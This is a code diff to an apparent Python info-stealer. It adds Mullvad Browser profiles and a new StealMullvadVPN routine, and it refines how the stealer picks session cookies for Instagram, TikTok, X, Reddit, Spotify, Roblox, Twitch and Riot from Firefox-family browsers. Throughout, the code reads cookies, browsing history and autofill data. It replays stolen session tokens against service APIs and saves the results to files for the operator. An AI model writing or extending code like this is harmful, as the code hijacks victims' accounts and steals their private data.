@@ -149,6 +149,7 @@ class get_data:
         self.GeckoBrowsers = {
             "Firefox": os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
             "SeaMonkey": os.path.join(self.appdata, "Mozilla", "SeaMonkey", "Profiles"),
+            "Mullvad": os.path.join(self.appdata, "Mullvad", "MullvadBrowser", "Profiles"),
             "IceCat": os.path.join(self.appdata, "Mozilla", "icecat", "Profiles"),
             "Pale Moon": os.path.join(self.appdata, "Moonchild Productions", "Pale Moon", "Profiles"),
             "Waterfox": os.path.join(self.appdata, "Waterfox", "Profiles"),
@@ -287,29 +288,31 @@ class get_data:
                     for cookie in cookies:
                         self.GeckoCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
-                            asyncio.create_task(self.StealInstagram(cookie[3], "Firefox"))
-                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
-                            asyncio.create_task(self.StealTikTok(cookie[3], "Firefox"))
-                        if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
-                            asyncio.create_task(self.StealTwitter(cookie[3], "Firefox"))
-                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
-                            asyncio.create_task(self.StealReddit(cookie[3], "Firefox"))
-                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
-                            asyncio.create_task(self.StealSpotify(cookie[3], "Firefox"))
+                            asyncio.create_task(self.StealInstagram(cookie[3], "Mozilla"))
+                        if ".tiktok.com" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
+                            asyncio.create_task(self.StealTikTok(cookie[3], "Mozilla"))
+                        if "mullvad" in str (cookie[0]).lower() and str (cookie[1]) == "accessToken":
+                            asyncio.create_task(self.StealMullvadVPN(cookie[3], "Mozilla"))
+                        if ".x.com" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
+                            asyncio.create_task(self.StealTwitter(cookie[3], "Mozilla"))
+                        if ".reddit.com" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
+                            asyncio.create_task(self.StealReddit(cookie[3], "Mozilla"))
+                        if ".spotify.com" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
+                            asyncio.create_task(self.StealSpotify(cookie[3], "Mozilla"))
                         if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
-                            asyncio.create_task(self.StealRoblox(cookie[3], "Firefox"))
+                            asyncio.create_task(self.StealRoblox(cookie[3], "Mozilla"))
                         if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                             twitch_cookie = cookie[3]
                         if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                             twitch_username = cookie[3]
                         if not twitch_username == None and not twitch_cookie == None:
-                            asyncio.create_task(self.StealTwitch(twitch_cookie, twitch_username, "Firefox"))
+                            asyncio.create_task(self.StealTwitch(twitch_cookie, twitch_username, "Mozilla"))
                             twitch_username = None
                             twitch_cookie = None
                         if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
-                            asyncio.create_task(self.StealRiotUser(cookie[3], "Firefox"))
+                            asyncio.create_task(self.StealRiotUser(cookie[3], "Mozilla"))
         except Exception as Error:
-            logs_handler(f"[ERROR] - getting firefox cookies - {str(Error)}")
+            logs_handler(f"[ERROR] - getting Mozilla cookies - {str(Error)}")
         else:
             pass
     async def GetGeckoHistorys(self) -> None:
@@ -323,7 +326,7 @@ class get_data:
                     for history in historys:
                         self.GeckoHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
         except Exception as Error:
-            logs_handler(f"[ERROR] - getting firefox historys - {str(Error)}")
+            logs_handler(f"[ERROR] - getting Mozilla historys - {str(Error)}")
         else:
             pass
 
@@ -338,7 +341,7 @@ class get_data:
                     for autofill in autofills:
                         self.GeckoAutofiList.append(f"{autofill[0]} = {autofill[1]}\n")
         except Exception as Error:
-            logs_handler(f"[ERROR] - getting firefox autofills - {str(Error)}")
+            logs_handler(f"[ERROR] - getting Mozilla autofills - {str(Error)}")
         else:
             pass
 
@@ -646,6 +649,8 @@ class get_data:
             logs_handler(f"twitter session error - {str(e)}")
         else:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
+ 
+ 
     async def StealRoblox(self, cookie, browser) -> None:
         try:
             async with aiohttp.ClientSession() as session:
@@ -1506,6 +1511,39 @@ class get_data:
             logs_handler(f"[ERROR] -getting SurfsharkVPN files: {str(Error)}")
             pass
 
+    async def StealMullvadVPN(self, cookie, browser) -> None:
+        url = 'https://api.mullvad.net/www/accounts/'
+
+        cookies = {
+            "accessToken": cookie
+        }
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        }
+
+        try:
+            async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
+                async with session.get(url, ssl=True) as response:
+                    if response.status != 200:
+                        return None
+
+                    account_data = await response.json()
+
+                    account_info = {
+                        'wg_peers': account_data.get('account', {}).get('wg_peers', []),
+                        'other_details': account_data.get('account', {}).get('other_details', {})
+                    }
+
+                    ListFonction.MullvadAccount.append(f"Account Informations:\n\n Account Data:\n{account_data}\nBrowser: {browser}")
+
+        except Exception as Error:
+            logs_handler(f"Error while getting mullvad informations: {Error}")
+            return None
+    
+
     async def BackupThunderbird(self, directory_path: str) -> None:
         try:
             thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
@@ -2000,6 +2038,10 @@ class get_data:
             if ListFonction.SteamUserAccounts:
                 with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.SteamUserAccounts:
+                        file.write(value)
+            if ListFonction.MullvadAccount:
+                with open(os.path.join(filePath, "Sessions", "mullvad_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.MullvadAccount:
                         file.write(value)
             if ListFonction.DiscordAccounts:
                 with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
